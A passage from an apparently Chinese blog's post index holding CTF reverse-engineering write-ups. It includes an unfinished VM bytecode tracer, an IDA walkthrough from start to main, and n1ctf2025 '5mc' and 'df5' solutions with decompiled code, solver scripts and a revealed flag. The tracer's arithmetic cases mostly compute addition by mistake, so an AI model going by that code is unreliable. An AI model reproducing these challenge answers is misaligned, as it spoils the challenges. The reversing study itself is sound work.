&lt;stdbool.h&gt;#include&lt;Windows.h&gt;unsigned char o[19457] = &#123; ......&#125;int main() &#123; int ax, bx, cx, dx; int abcdx[16] = &#123; 0 &#125;; unsigned char stack[256] = &#123; 0 &#125;; for (size_t i = 0; i &lt; 19444; i += 4) &#123; printf(&quot;%x %x %x %x:&quot;, o[i], o[i + 1], o[i + 2], o[i + 3]); switch (o[i]) &#123; //ldr case 0x11: printf(&quot;abcdx[%d] = %d //stack[%d]\\n&quot;, o[i + 1] &amp; 0xf, stack[o[i + 2]], o[i + 2]); abcdx[o[i + 1]] = stack[o[i + 2]]; break; case 0x13: printf(&quot;abcdx[%d] = %d //stack[%d]\\n&quot;, o[i + 1] &amp; 0xf, stack[o[i + 2]], o[i + 2]); abcdx[o[i + 1]] = stack[o[i + 2]]; break; //ldri case 0x12: printf(&quot;------------------------------\\n&quot;); printf(&quot;abcdx[%d] = stack[%d]\\n&quot;, o[i + 1] &amp; 0xf, o[i + 3]); abcdx[o[i + 1] &amp; 0xf] = stack[o[i + 3]]; break; case 0x14: printf(&quot;------------------------------\\n&quot;); printf(&quot;abcdx[%d] = stack[%d]\\n&quot;, o[i + 1] &amp; 0xf, o[i + 3]); abcdx[o[i + 1] &amp; 0xf] = stack[o[i + 3]]; break; //str case 0x15: printf(&quot;stack[%d] = %d //stack[%d]\\n&quot;, o[i + 2], abcdx[o[i + 1] &amp; 0xf], o[i + 1]); stack[o[i + 2]] = abcdx[o[i + 1] &amp; 0xf]; break; case 0x17: printf(&quot;stack[%d] = %d //stack[%d]\\n&quot;, o[i + 2], abcdx[o[i + 1] &amp; 0xf], o[i + 1]); stack[o[i + 2]] = abcdx[o[i + 1] &amp; 0xf]; break; //stri case 0x16: printf(&quot;stack[%d] = %d //stack[%d]\\n&quot;, o[i + 3], abcdx[o[i + 1] &amp; 0xf], o[i + 1]); stack[o[i + 3]] = abcdx[o[i + 1] &amp; 0xf]; break; case 0x18: printf(&quot;stack[%d] = %d //stack[%d]\\n&quot;, o[i + 3], abcdx[o[i + 1] &amp; 0xf], o[i + 1]); stack[o[i + 3]] = abcdx[o[i + 1] &amp; 0xf]; break; //mov case 0x2A: printf(&quot;abcdx[%d] = %x%x //&quot;, o[i + 1], o[i + 3], o[i + 2]); ax = o[i + 2]; ax += o[i + 3] &lt;&lt; 8; abcdx[(o[i + 1]) &amp; 0xf] = ax; printf(&quot;%04x\\n&quot;, abcdx[(o[i + 1]) &amp; 0xf]); break; case 0x2B: printf(&quot;abcdx[%d] = %x%x //&quot;, o[i + 1], o[i + 3], o[i + 2]); ax = o[i + 2]; ax += o[i + 3] &lt;&lt; 8; abcdx[(o[i + 1]) &amp; 0xf] = ax; printf(&quot;%04x\\n&quot;, abcdx[(o[i + 1]) &amp; 0xf]); break; //add case 0x91: printf(&quot;abcdx[%d] = %d //%d + abcdx[%d] &quot;, o[i + 1] &amp; 0xf, o[i + 2] + abcdx[o[i + 3] &amp; 0xf], o[i + 2], o[i + 3] &amp; 0xf); abcdx[(o[i + 1]) &amp; 0xf] = o[i + 2] + abcdx[(o[i + 3]) &amp; 0xf]; printf(&quot;abcdx[%d] = %d\\n&quot;, (o[i + 1]) &amp; 0xf, abcdx[(o[i + 1]) &amp; 0xf]); break; case 0x41: printf(&quot;abcdx[%d] = %d //%d + abcdx[%d] &quot;, o[i + 1] &amp; 0xf, o[i + 2] + abcdx[o[i + 3] &amp; 0xf], o[i + 2], o[i + 3] &amp; 0xf); abcdx[(o[i + 1]) &amp; 0xf] = o[i + 2] + abcdx[(o[i + 3]) &amp; 0xf]; printf(&quot;abcdx[%d] = %d\\n&quot;, (o[i + 1]) &amp; 0xf, abcdx[(o[i + 1]) &amp; 0xf]); break; //sub case 0x42: printf(&quot;abcdx[%d] = %d //%d - abcdx[%d] &quot;, o[i + 1] &amp; 0xf, o[i + 2] - abcdx[o[i + 3] &amp; 0xf], o[i + 2], o[i + 3] &amp; 0xf); abcdx[(o[i + 1]) &amp; 0xf] = o[i + 2] + abcdx[(o[i + 3]) &amp; 0xf]; printf(&quot;abcdx[%d] = %d\\n&quot;, (o[i + 1]) &amp; 0xf, abcdx[(o[i + 1]) &amp; 0xf]); break; case 0x92: printf(&quot;abcdx[%d] = %d //%d - abcdx[%d] &quot;, o[i + 1] &amp; 0xf, o[i + 2] - abcdx[o[i + 3] &amp; 0xf], o[i + 2], o[i + 3] &amp; 0xf); abcdx[(o[i + 1]) &amp; 0xf] = o[i + 2] + abcdx[(o[i + 3]) &amp; 0xf]; printf(&quot;abcdx[%d] = %d\\n&quot;, (o[i + 1]) &amp; 0xf, abcdx[(o[i + 1]) &amp; 0xf]); break; //mul case 0x47: printf(&quot;abcdx[%d] = %d //%d * abcdx[%d] &quot;, o[i + 1] &amp; 0xf, o[i + 2] * abcdx[o[i + 3] &amp; 0xf], o[i + 2], o[i + 3] &amp; 0xf); abcdx[(o[i + 1]) &amp; 0xf] = o[i + 2] + abcdx[(o[i + 3]) &amp; 0xf]; printf(&quot;abcdx[%d] = %d\\n&quot;, (o[i + 1]) &amp; 0xf, abcdx[(o[i + 1]) &amp; 0xf]); break; case 0x97: printf(&quot;abcdx[%d] = %d //%d * abcdx[%d] &quot;, o[i + 1] &amp; 0xf, o[i + 2] * abcdx[o[i + 3] &amp; 0xf], o[i + 2], o[i + 3] &amp; 0xf); abcdx[(o[i + 1]) &amp; 0xf] = o[i + 2] + abcdx[(o[i + 3]) &amp; 0xf]; printf(&quot;abcdx[%d] = %d\\n&quot;, (o[i + 1]) &amp; 0xf, abcdx[(o[i + 1]) &amp; 0xf]); break; //xor case 0x7A: printf(&quot;abcdx[%d] = %d //%d + abcdx[%d] &quot;, o[i + 1] &amp; 0xf, o[i + 2] ^ abcdx[o[i + 3] &amp; 0xf], o[i + 2], o[i + 3] &amp; 0xf); abcdx[(o[i + 1]) &amp; 0xf] = o[i + 2] + abcdx[(o[i + 3]) &amp; 0xf]; printf(&quot;abcdx[%d] = %d\\n&quot;, (o[i + 1]) &amp; 0xf, abcdx[(o[i + 1]) &amp; 0xf]); break; case 0xca: printf(&quot;abcdx[%d] = %d //%d + abcdx[%d] &quot;, o[i + 1] &amp; 0xf, o[i + 2] ^ abcdx[o[i + 3] &amp; 0xf], o[i + 2], o[i + 3] &amp; 0xf); abcdx[(o[i + 1]) &amp; 0xf] = o[i + 2] + abcdx[(o[i + 3]) &amp; 0xf]; printf(&quot;abcdx[%d] = %d\\n&quot;, (o[i + 1]) &amp; 0xf, abcdx[(o[i + 1]) &amp; 0xf]); break; //lsl case 0x71: printf(&quot;abcdx[%d] = %d //%d &lt;&lt; abcdx[%d] &quot;, o[i + 1] &amp; 0xf, o[i + 2] &lt;&lt; abcdx[o[i + 3] &amp; 0xf], o[i + 2], o[i + 3] &amp; 0xf); abcdx[(o[i + 1]) &amp; 0xf] = o[i + 2] + abcdx[(o[i + 3]) &amp; 0xf]; printf(&quot;abcdx[%d] = %d\\n&quot;, (o[i + 1]) &amp; 0xf, abcdx[(o[i + 1]) &amp; 0xf]); break; case 0xc1: printf(&quot;abcdx[%d] = %d //%d &lt;&lt; abcdx[%d] &quot;, o[i + 1] &amp; 0xf, o[i + 2] &lt;&lt; abcdx[o[i + 3] &amp; 0xf], o[i + 2], o[i + 3] &amp; 0xf); abcdx[(o[i + 1]) &amp; 0xf] = o[i + 2] + abcdx[(o[i + 3]) &amp; 0xf]; printf(&quot;abcdx[%d] = %d\\n&quot;, (o[i + 1]) &amp; 0xf, abcdx[(o[i + 1]) &amp; 0xf]); break; //lsr case 0x73: printf(&quot;abcdx[%d] = %d //%d &gt;&gt; abcdx[%d] &quot;, o[i + 1] &amp; 0xf, o[i + 2] &gt;&gt; abcdx[o[i + 3] &amp; 0xf], o[i + 2], o[i + 3] &amp; 0xf); abcdx[(o[i + 1]) &amp; 0xf] = o[i + 2] + abcdx[(o[i + 3]) &amp; 0xf]; printf(&quot;abcdx[%d] = %d\\n&quot;, (o[i + 1]) &amp; 0xf, abcdx[(o[i + 1]) &amp; 0xf]); break; case 0xc3: printf(&quot;abcdx[%d] = %d //%d &gt;&gt; abcdx[%d] &quot;, o[i + 1] &amp; 0xf, o[i + 2] &gt;&gt; abcdx[o[i + 3] &amp; 0xf], o[i + 2], o[i + 3] &amp; 0xf); abcdx[(o[i + 1]) &amp; 0xf] = o[i + 2] + abcdx[(o[i + 3]) &amp; 0xf]; printf(&quot;abcdx[%d] = %d\\n&quot;, (o[i + 1]) &amp; 0xf, abcdx[(o[i + 1]) &amp; 0xf]); break; //and case 0xcb: printf(&quot;abcdx[%d] = %d //%d &amp; abcdx[%d] &quot;, o[i + 1] &amp; 0xf, o[i + 2] &amp; abcdx[o[i + 3] &amp; 0xf], o[i + 2], o[i + 3] &amp; 0xf); abcdx[(o[i + 1]) &amp; 0xf] = o[i + 2] + abcdx[(o[i + 3]) &amp; 0xf]; printf(&quot;abcdx[%d] = %d\\n&quot;, (o[i + 1]) &amp; 0xf, abcdx[(o[i + 1]) &amp; 0xf]); break; case 0x7B: printf(&quot;abcdx[%d] = %d //%d &amp; abcdx[%d] &quot;, o[i + 1] &amp; 0xf, o[i + 2] &amp; abcdx[o[i + 3] &amp; 0xf], o[i + 2], o[i + 3] &amp; 0xf); abcdx[(o[i + 1]) &amp; 0xf] = o[i + 2] + abcdx[(o[i + 3]) &amp; 0xf]; printf(&quot;abcdx[%d] = %d\\n&quot;, (o[i + 1]) &amp; 0xf, abcdx[(o[i + 1]) &amp; 0xf]); break; case 0xff: printf(&quot;hlt\\n&quot;); break; case 0xfe: printf(&quot;ret\\n&quot;); break; &#125; &#125; for (int i = 0; i &lt; 0x100; i++) &#123; printf(&quot;%02x &quot;, stack[i]); &#125; printf(&quot;\\n&quot;); for (int i = 0; i &lt; 0x10; i++) &#123; printf(&quot;%02x &quot;, abcdx[i]); &#125; return 0;&#125; 但是这玩意太太太长了。。。懒得分析了，到此结束 。。。是xxtea。。。不做了","updated":"2025-10-08T09:41:06.042Z","categories":[{"name":"ctf","slug":"ctf","permalink":"https://l1pmoluy.github.io/categories/ctf/"}],"tags":[{"name":"wp","slug":"wp","permalink":"https://l1pmoluy.github.io/tags/wp/"}]},{"title":"'main'","date":"2025-03-25T07:54:14.000Z","path":"2025/03/25/main/","text":"致梦的开始 前言这篇文章是在第一学期快结束补充的，我不断地思索，哪个文章可以作为逆向启程呢，是ida的熟悉流程？是遇到最简单题目的题解？是c语言的小知识？亦或是其他，但我总认为，这些不足以为我的逆向开一个好头，思来想去最后决定以main函数来作为逆向的启蒙 start开始，也意味着程序的开始，一个用c语言写好了main的程序并不是直接从main开始的，而是start，start紧接着去调用很多函数，他最终的目的也是位main铺路 以一个最简单的程序为例： 12345#include&lt;stdio.h&gt;int main() &#123; printf(&quot;hallo re&quot;); return 0;&#125; 将这个程序生成的文件拖入ida hello re12345// attributes: thunk__int64 start()&#123; return start_0();&#125; 反编译出的第一条是他，start，什么都没有，不过别急，点进去，连着点进去两个函数出现了第一个岔路 12345__int64 sub_140011E30()&#123; road1(); return road2();&#125; 这两个函数原本不叫这个，是我将其随意命名的，他在你的ida中可能会叫sub_地址，是ida给这个函数起的名字，选择road2点进去 123456789101112131415161718192021222324252627282930313233343536373839404142434445__int64 sub_140011E50()&#123; __int64 v1; // rcx char v2; // [rsp+20h] [rbp-48h] unsigned __int8 v3; // [rsp+21h] [rbp-47h] unsigned int Code; // [rsp+28h] [rbp-40h] void (__fastcall **v5)(_QWORD, __int64, _QWORD); // [rsp+30h] [rbp-38h] _tls_callback_type *v6; // [rsp+38h] [rbp-30h] if ( !(unsigned __int8)sub_140011393(1i64) ) sub_140011311(7i64); v2 = 0; v3 = sub_140011325(); if ( dword_14001D1F8 == 1 ) &#123; sub_140011311(7i64); &#125; else if ( dword_14001D1F8 ) &#123; v2 = 1; &#125; else &#123; dword_14001D1F8 = 1; if ( j__initterm_e((_PIFV *)&amp;First, (_PIFV *)&amp;Last) ) return 255i64; j__initterm((_PVFV *)&amp;qword_14001A000, (_PVFV *)&amp;qword_14001A220); dword_14001D1F8 = 2; &#125; sub_1400112FD(v3); v5 = (void (__fastcall **)(_QWORD, __int64, _QWORD))sub_140011299(); if ( *v5 &amp;&amp; (unsigned __int8)sub_14001114F(v5) ) (*v5)(0i64, 2i64, 0i64); v6 = (_tls_callback_type *)sub_1400112CB(); if ( *v6 &amp;&amp; (unsigned __int8)sub_14001114F(v6) ) j__register_thread_local_exe_atexit_callback(*v6); Code = sub_1400120A0(); if ( !(unsigned __int8)sub_140011276() ) j_exit(Code); if ( !v2 ) j__cexit(); LOBYTE(v1) = 1; sub_140011140(v1, 0i64); return Code;&#125; 看到最后return Code了吗，记得一个main函数的基本框架有return 0吗，当时说0是返回值，返回程序是否正确运行，那么如果想要返回值0，返回到start那里，这一步返回的Code里面的值就应该是return的0，我们要去看Code在这个程序里那里被定义了——sub_1400120A0，在37行，所以说这个函数往里延伸的就是main函数，点进去 1234567891011__int64 sub_1400120A0()&#123; unsigned int v1; // [rsp+20h] [rbp-28h] char **initial_narrow_environment; // [rsp+28h] [rbp-20h] char **v3; // [rsp+30h] [rbp-18h] initial_narrow_environment = j__get_initial_narrow_environment(); v3 = *j___p___argv(); v1 = *j___p___argc(); return sub_14001126C(v1, v3, initial_narrow_environment);&#125; 还是刚刚的原理，return返回的要是main里面返回的0，所以点开return后跟着的函数，一路到底 123456int __cdecl main(int argc, const char **argv, const char **envp)&#123; sub_14001136B(&amp;unk_140022008); printf(&quot;hallo re&quot;); return 0;&#125; 获得了主函数，如果到这里不是很明白的话，从最后一段代码的return 0，回到最初的start，观察一下，0是不是一直作为返回值被返回 终逆向就是这样，总会有很多东西混淆你，谨记自己的初心，静下来，慢慢观察，最终你也可以从空白的的start抵达目标main","updated":"2025-10-08T09:43:32.891Z","categories":[{"name":"逆向行驶","slug":"逆向行驶","permalink":"https://l1pmoluy.github.io/categories/%E9%80%86%E5%90%91%E8%A1%8C%E9%A9%B6/"}],"tags":[]},{"title":"n1ctf2025-re-wp","date":"2025-02-11T05:55:14.000Z","path":"2025/02/11/2025n1ctf/","text":"写了逆向方向两个题5mc,df5 5mc拖进ida，32位，后面有一段比较冗长但又难以理解的代码，实际作用是在初始化后续的加密段 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134 sub_7FF67C8E1020(&quot;flag:&quot;, argv, envp); sub_7FF67C8E1080(&quot;%s&quot;, Buf1); n32_2 = -1LL; do ++n32_2; while ( Buf1[n32_2] ); if ( n32_2 == 32 ) &#123; srand(0x1BF52u); box = box; n256 = 0; v9 = off_7FF67C905070; box_1 = box; v11 = off_7FF67C905078; v12 = off_7FF67C905080; do *box_1++ = n256++; while ( n256 &lt; 256 ); n512 = 512LL; do &#123; v14 = rand(); v15 = rand(); v16 = box[v14]; box[v14] = box[v15]; box[v15] = v16; --n512; &#125; while ( n512 ); n32 = 0; v18 = v9; do *v18++ = n32++; while ( n32 &lt; 32 ); n32_1 = 32LL; do &#123; v20 = rand() % 32; v21 = rand() % 32; v22 = v9[v20]; v9[v20] = v9[v21]; v9[v21] = v22; --n32_1; &#125; while ( n32_1 ); for ( i = 0LL; i &lt; 32; ++i ) v11[i] = rand(); for ( j = 0LL; j &lt; 32; ++j ) v12[j] = rand(); n17 = 0; v26 = 0LL; do &#123; v27 = VirtualAlloc(0LL, 0xD2uLL, MEM_COMMIT, PAGE_READWRITE); lpAddress[v26] = v27; if ( !v27 ) return -1; v28 = v43[v26]; ++n17; ++v26; *v27 = *v28; v27[1] = v28[1]; v27[2] = v28[2]; v27[3] = v28[3]; v27[4] = v28[4]; v27[5] = v28[5]; v27[6] = v28[6]; v29 = v28[7]; v28 += 8; v27[7] = v29; v27[8] = *v28; v27[9] = v28[1]; v27[10] = v28[2]; v27[11] = v28[3]; v27[12] = v28[4]; *(v27 + 104) = *(v28 + 40); &#125; while ( n17 &lt; 17 ); lpAddress_1 = lpAddress[0]; for ( k = 0LL; k &lt; 16; ++k ) &#123; for ( m = 0LL; m &lt; 17; ++m ) &#123; if ( m != k + 1 ) &#123; v33 = lpAddress[m]; n192 = 0LL; v35 = lpAddress[k + 1]; if ( v33 &lt;= (v35 + 209) &amp;&amp; &amp;v33[13].m128i_i8[1] &gt;= v35 ) goto LABEL_37; v36 = v33 + 2; do &#123; v37 = _mm_loadu_si128(v36 - 2); v36 += 4; v38 = _mm_loadu_si128(&amp;v35[n192 + 32]); v36[-6] = _mm_xor_si128(_mm_loadu_si128(&amp;v35[n192]), v37); v36[-5] = _mm_xor_si128(_mm_loadu_si128(&amp;v35[n192 + 16]), _mm_loadu_si128(v36 - 5)); v39 = _mm_loadu_si128(&amp;v35[n192 + 48]); n192 += 64LL; v36[-4] = _mm_xor_si128(v38, _mm_loadu_si128(v36 - 4)); v36[-3] = _mm_xor_si128(v39, _mm_loadu_si128(v36 - 3)); &#125; while ( n192 &lt; 192 ); if ( n192 &lt; 210 ) &#123;LABEL_37: do &#123; v33-&gt;m128i_i8[n192] ^= v35[n192]; ++n192; &#125; while ( n192 &lt; 210 ); &#125; &#125; &#125; memset(lpAddress[k + 1], 0, 0xD2uLL); VirtualProtect(lpAddress_1, 0xD2uLL, PAGE_EXECUTE_READ, flOldProtect); (lpAddress_1)(Buf1, &amp;box); VirtualProtect(lpAddress_1, 0xD2uLL, PAGE_READWRITE, flOldProtect); &#125; v40 = memcmp(Buf1, &amp;Buf2_, 0x20uLL); right_n = &quot;right\\n&quot;; if ( v40 ) right_n = &quot;wrong\\n&quot;; sub_7FF67C8E1020(right_n, &quot;wrong\\n&quot;, envp_1); return 0; &#125; else &#123; sub_7FF67C8E1020(&quot;wrong\\n&quot;, argv_1, envp_2); return 0; &#125;&#125; 这里是加密主要逻辑，对明文的加密段存储在lpAddress中，并且不是一成不变的，这里利用了SSE来进行对加密段的异或，看似复杂，实际上只是实现了同一段代码，经过不同种的异或最终做到不同的加密方式 还好是一个可以动调的程序，所以只需关注下面的(v30)(Buf1, &amp;box); 16种加密，每四个一轮，每轮中前两种加密相同，后两种都比较相似，耐心即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;unsigned char box1[256] = &#123; 0xB0, 0xF0, 0x21, 0xCF, 0xF2, 0x04, 0x3A, 0x68, 0x84, 0x7B, 0x39, 0x86, 0x36, 0x87, 0x9B, 0xF7, 0x3D, 0x18, 0x1E, 0x61, 0x1B, 0x2E, 0x6C, 0xDF, 0x2C, 0xAE, 0x65, 0x9D, 0xEB, 0x2F, 0xDA, 0xF4, 0xDE, 0xCA, 0x56, 0x92, 0x75, 0x3B, 0x62, 0x45, 0x06, 0x3C, 0x52, 0x33, 0x6E, 0x25, 0xCE, 0xA3, 0xD2, 0x44, 0xA1, 0x4A, 0x58, 0xB1, 0xA0, 0x2A, 0x47, 0x0A, 0x02, 0xAF, 0x50, 0xC3, 0xDC, 0xEA, 0xE5, 0x0D, 0x67, 0x91, 0xE1, 0x51, 0xE3, 0xC1, 0xAA, 0x95, 0x5C, 0x79, 0x72, 0x1C, 0x3F, 0xB8, 0xE8, 0x1F, 0xFF, 0x7A, 0x73, 0x26, 0x54, 0x9E, 0xED, 0xA9, 0x41, 0x20, 0xEF, 0xA6, 0x48, 0x97, 0x4F, 0xD4, 0xBB, 0x23, 0x66, 0xD9, 0xE4, 0x0B, 0x30, 0x15, 0xD7, 0x6B, 0x19, 0xCD, 0xC4, 0x08, 0xB4, 0xC8, 0x14, 0xFD, 0x7F, 0x28, 0x0E, 0x05, 0x0F, 0x4B, 0x6F, 0xF5, 0x90, 0x76, 0xBF, 0x60, 0xE7, 0x24, 0x78, 0x6D, 0x71, 0xA8, 0x43, 0xB5, 0x0C, 0x31, 0xF9, 0xA2, 0x9C, 0x99, 0xF6, 0x2D, 0xDB, 0xB7, 0xC9, 0x85, 0x81, 0x03, 0x64, 0x1D, 0x07, 0x34, 0x5A, 0xBD, 0x37, 0x4C, 0xA7, 0x5F, 0x46, 0xE9, 0x35, 0x93, 0x8D, 0xA5, 0xFB, 0x42, 0x01, 0xC2, 0x17, 0x12, 0x1A, 0x77, 0xC6, 0x53, 0x83, 0x4D, 0xB2, 0x10, 0x2B, 0xF8, 0x88, 0x6A, 0x3E, 0xD0, 0x7C, 0x63, 0x40, 0x27, 0xBE, 0xD5, 0x38, 0xD1, 0x74, 0xB6, 0x57, 0x94, 0xAB, 0x8A, 0xB9, 0xBC, 0x7D, 0xB3, 0x96, 0x7E, 0xFC, 0xAD, 0x22, 0x4E, 0xFA, 0xE0, 0xCB, 0x8B, 0xEE, 0x32, 0xA4, 0x16, 0xFE, 0x5B, 0x13, 0xDD, 0xC0, 0x9A, 0x5E, 0x8E, 0x29, 0xF3, 0x8F, 0x49, 0xE6, 0x9F, 0xF1, 0xC5, 0x70, 0x55, 0x8C, 0x11, 0xCC, 0x5D, 0xEC, 0x00, 0xAC, 0x89, 0xD3, 0x82, 0x69, 0xD6, 0xBA, 0xD8, 0x59, 0x98, 0x09, 0x80, 0xE2, 0xC7&#125;;unsigned char box2[32] = &#123; 0x13, 0x1F, 0x10, 0x1D, 0x01, 0x0D, 0x07, 0x15, 0x08, 0x06, 0x16, 0x00, 0x0F, 0x0C, 0x02, 0x05, 0x0E, 0x03, 0x12, 0x04, 0x18, 0x14, 0x1A, 0x1C, 0x1E, 0x19, 0x09, 0x1B, 0x11, 0x0B, 0x17, 0x0A&#125;;unsigned char box3[32] = &#123; 0x7D, 0xB7, 0x24, 0x7E, 0xC3, 0x6B, 0xBD, 0xD8, 0x7F, 0x13, 0x6E, 0x0F, 0x43, 0xCD, 0x6B, 0xCF, 0x18, 0x4F, 0x26, 0x18, 0x12, 0x2A, 0x7E, 0x9B, 0x27, 0x4C, 0x33, 0x67, 0x40, 0xC9, 0x9E, 0xC4&#125;;unsigned char box4[32] = &#123; 0x91, 0xDB, 0x9F, 0x5F, 0x26, 0x27, 0xD6, 0xA8, 0xBF, 0x41, 0x16, 0x79, 0xDE, 0x73, 0x16, 0xF8, 0x1E, 0xBA, 0x6A, 0xBE, 0xC6, 0x12, 0xB2, 0x39, 0x9E, 0xF3, 0x12, 0x4E, 0x02, 0x1C, 0xE2, 0x43&#125;;unsigned char sbox1[256] = &#123; 0 &#125;;void getsbox1() &#123; for (int i = 0; i &lt; 256; i++) &#123; sbox1[box1[i]] = i; &#125;&#125;void decrpty(unsigned char* flag, int length) &#123; int i, j; char v2[32]; for (j = 0; j &lt;= 31; ++j) v2[j] = flag[box2[j]]; for (i = 0; i &lt;= 31; ++i) flag[i] = v2[box2[i]]; for (i = 0; i &lt; length; i++) &#123; flag[i] = sbox1[flag[i]]; &#125;&#125;int main() &#123; // 生成 box1 的逆查表 getsbox1(); // 初始加密后的 flag，与加密程序中保持一致 unsigned char flag[32] = &#123; 0x5B, 0x2D, 0xE9, 0x66, 0xED, 0x39, 0x90, 0x23, 0xAF, 0xDA, 0xEB, 0x2E, 0xD1, 0x0D, 0xBB, 0xBD, 0x57, 0x52, 0x02, 0xB0, 0xBA, 0x9D, 0x52, 0xFA, 0x67, 0xEE, 0xA3, 0x85, 0xA9, 0x84, 0xE2, 0x6F &#125;; int length = 32; int i, j; for (i = 0; i &lt;= 31; ++i) &#123; flag[i] = (flag[i] &lt;&lt; 7) | (flag[i] &gt;&gt; 1); flag[i] = (box3[i] ^ flag[i]) - box4[i]; &#125; for (i = 0; i &lt;= 31; ++i) &#123; flag[i] = (flag[i] &lt;&lt; 6) | (flag[i] &gt;&gt; 2); flag[i] = box3[i] ^ (flag[i] - box4[i]); &#125; decrpty(flag, length); for (i = 0; i &lt;= 31; ++i) &#123; flag[i] = (flag[i] &lt;&lt; 3) | (flag[i] &gt;&gt; 5); flag[i] = (box3[i] ^ flag[i]) - box4[i]; &#125; for (i = 0; i &lt;= 31; ++i) &#123; flag[i] = (flag[i] &lt;&lt; 5) | (flag[i] &gt;&gt; 3); flag[i] = box3[i] ^ (flag[i] - box4[i]); &#125; decrpty(flag, length); for (i = 0; i &lt;= 31; ++i) &#123; flag[i] = (flag[i] &lt;&lt; 4) | (flag[i] &gt;&gt; 4); flag[i] = (box3[i] ^ flag[i]) - box4[i]; &#125; for (i = 0; i &lt;= 31; ++i) &#123; flag[i] = (flag[i] &lt;&lt; 2) | (flag[i] &gt;&gt; 6); flag[i] = box3[i] ^ (flag[i] - box4[i]); &#125; decrpty(flag, length); for (i = 0; i &lt;= 31; ++i) &#123; flag[i] = (flag[i] &lt;&lt; 1) | (flag[i] &gt;&gt; 7); flag[i] = (box3[i] ^ flag[i]) - box4[i]; &#125; for (i = 0; i &lt;= 31; ++i) &#123; flag[i] = (flag[i] &lt;&lt; 5) | (flag[i] &gt;&gt; 3); flag[i] = box3[i] ^ (flag[i] - box4[i]); &#125; decrpty(flag, length); for (int i = 0; i &lt; 32; i++) &#123; printf(&quot;0x%x,&quot;, flag[i]); &#125; printf(&quot;\\n&quot;); for (int i = 0; i &lt; 32; i++) &#123; printf(&quot;%c&quot;, flag[i]); &#125; printf(&quot;\\n&quot;); return 0;&#125;//flag&#123;Master_of_5mc_XoR_aDD_r0r!&#125; df5这道题难在解密实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int64 v3; // rdi const char *v4; // rdx __int64 v5; // r8 __int64 len; // rax const char *v7; // rcx _BYTE *ppbox1; // rsi int v9; // eax _BYTE *ppbox2; // r14 _BYTE *pppbox1; // rcx _BYTE *ppbox3; // r15 _BYTE *ppbox4; // r12 __int64 v14; // rbp unsigned __int8 v15; // bl unsigned __int8 v16; // al char v17; // r8 int v18; // eax _BYTE *v19; // rcx __int64 v20; // rsi unsigned __int8 v21; // bl unsigned __int8 v22; // al char v23; // r8 __int64 i; // rbx __int64 j; // rbx int v26; // eax __int64 v28[4]; // [rsp+28h] [rbp-70h] char Buf1[40]; // [rsp+48h] [rbp-50h] BYREF v3 = 0i64; v28[0] = sub_7FF6C66410E0; v28[1] = sub_7FF6C66412A0; v28[2] = sub_7FF6C6641610; v28[3] = sub_7FF6C66416B0; sub_7FF6C6641020(&quot;flag:&quot;, argv, envp); scnaf(&quot;%s&quot;, Buf1); len = -1i64; do ++len; while ( Buf1[len] ); if ( len == 32 ) &#123; srand(0x1BF52u); ppbox1 = pbox1; v9 = 0; ppbox2 = pbox2; pppbox1 = pbox1; ppbox3 = pbox3; ppbox4 = pbox4; do *pppbox1++ = v9++; // 造盒 while ( v9 &lt; 256 ); v14 = 512i64; do &#123; v15 = rand(); v16 = rand(); v17 = ppbox1[v15]; ppbox1[v15] = ppbox1[v16]; // 打乱盒 ppbox1[v16] = v17; --v14; &#125; while ( v14 ); v18 = 0; v19 = ppbox2; do *v19++ = v18++; while ( v18 &lt; 32 ); v20 = 32i64; do &#123; v21 = rand() % 32; v22 = rand() % 32; v23 = ppbox2[v21]; ppbox2[v21] = ppbox2[v22]; // 打乱box2 ppbox2[v22] = v23; --v20; &#125; while ( v20 ); for ( i = 0i64; i &lt; 32; ++i ) ppbox3[i] = rand(); for ( j = 0i64; j &lt; 32; ++j ) ppbox4[j] = rand(); do (v28[Buf1[v3++] &amp; 3])(Buf1, &amp;pbox1); while ( v3 &lt; 32 ); v26 = memcmp(Buf1, &amp;unk_7FF6C6665AD0, 0x20ui64); v7 = &quot;right\\n&quot;; v4 = &quot;wrong\\n&quot;; if ( v26 ) v7 = &quot;wrong\\n&quot;; &#125; else &#123; v7 = &quot;wrong\\n&quot;; &#125; sub_7FF6C6641020(v7, v4, v5); return 0;&#125; 可以看到，也是四种加密方式，不同的是加密逻辑是根据输入的每一位&amp;3，形成的结果进行加密，32轮，如此一来解密时就需要知道上一轮经过什么加密，我先对当前轮对应的明文元素称之为，加密种数，我的想法是，先将密文四种都尝试解密，解密后的加密种数&amp;3，查看是否结果与它所经过的加密一致 但同时有新的问题，如果它的解密结果刚好一致呢？所以要采取回溯法，就像走迷宫一样，这条路走不通，就回退换路，实现我选用递归 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;time.h&gt;unsigned char box3[32] = &#123; 0x7D, 0xB7, 0x24, 0x7E, 0xC3, 0x6B, 0xBD, 0xD8, 0x7F, 0x13, 0x6E, 0x0F, 0x43, 0xCD, 0x6B, 0xCF, 0x18, 0x4F, 0x26, 0x18, 0x12, 0x2A, 0x7E, 0x9B, 0x27, 0x4C, 0x33, 0x67, 0x40, 0xC9, 0x9E, 0xC4&#125;;unsigned char box4[32] = &#123; 0x91, 0xDB, 0x9F, 0x5F, 0x26, 0x27, 0xD6, 0xA8, 0xBF, 0x41, 0x16, 0x79, 0xDE, 0x73, 0x16, 0xF8, 0x1E, 0xBA, 0x6A, 0xBE, 0xC6, 0x12, 0xB2, 0x39, 0x9E, 0xF3, 0x12, 0x4E, 0x02, 0x1C, 0xE2, 0x43&#125;;unsigned char box2[32] = &#123; 0x13, 0x1F, 0x10, 0x1D, 0x01, 0x0D, 0x07, 0x15, 0x08, 0x06, 0x16, 0x00, 0x0F, 0x0C, 0x02, 0x05, 0x0E, 0x03, 0x12, 0x04, 0x18, 0x14, 0x1A, 0x1C, 0x1E, 0x19, 0x09, 0x1B, 